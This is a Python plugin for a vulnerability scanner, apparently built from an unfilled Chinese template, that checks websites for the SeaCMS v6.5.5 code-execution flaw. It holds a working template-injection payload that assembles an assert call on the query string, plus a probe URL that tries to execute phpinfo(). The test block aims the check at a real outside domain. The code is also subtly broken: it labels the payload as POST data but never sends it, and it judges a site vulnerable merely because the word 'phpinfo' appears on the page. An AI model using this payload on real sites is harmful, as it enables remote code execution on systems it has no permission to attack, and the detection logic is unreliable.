#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 漏洞名称（禁止换行）控制在30字以内
referer: 漏洞地址（禁止换行）未知请填unknown
author: 作者名
description: 漏洞描述 
'''
import sys
import requests
import warnings
def run(url):
    #此处编辑检测代码
    #示例代码，请更改result内容，result[0]为漏洞名称,result[1]为返回的内容，result[2]为测试结果
    result = ['seacms v6.5.5代码执行漏洞','','']
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*"
    url_path = url + "/search.php?phpinfo();"
    try:
        data = requests.get(url_path, timeout=3,headers=headers, verify=False)
        if data.status_code == 200 and 'phpinfo' in data.text:
            result[2]= "存在"
            result[1] = "URL:%s\nPOST:%s"%(url_path,payload)
        else:
            result[2] = "不存在"
    except Exception as e:
        # print (e)
        result[2] ="不存在"
        #这里可设置未知，连接超时等，只有不存在不会显示到结果中。
    return result
    #最后一定要返回一个带有3个参数的列表。不然会出错误。

if __name__ == "__main__":
    #此处不会调用
    warnings.filterwarnings("ignore")
    testVuln = run("http://baidu.com")
    print(testVuln)